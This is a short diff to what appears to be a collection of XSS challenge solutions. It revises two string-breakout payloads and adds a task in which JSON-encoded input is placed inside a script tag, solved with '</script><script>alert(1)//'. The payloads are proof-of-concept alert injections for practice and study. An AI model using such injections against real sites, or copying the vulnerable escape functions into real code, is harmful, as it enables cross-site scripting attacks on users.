@@ -72,7 +72,7 @@ function escape(s) {
 -Solution
 
 ```js
-"); alert(1) //
+",alert(1),"
 ```
 
 -Task
@@ -87,5 +87,20 @@ function escape(s) {
 - Solution
 
 ```js
-\"); alert(1) //
+\");alert(1)//
+```
+
+- Task
+
+```js
+function escape(s) {
+  s = JSON.stringify(s);
+  return '<script>console.log(' + s + ');</script>';
+}
+```
+
+-Solution
+
+```js
+</script><script>alert(1)//
 ```
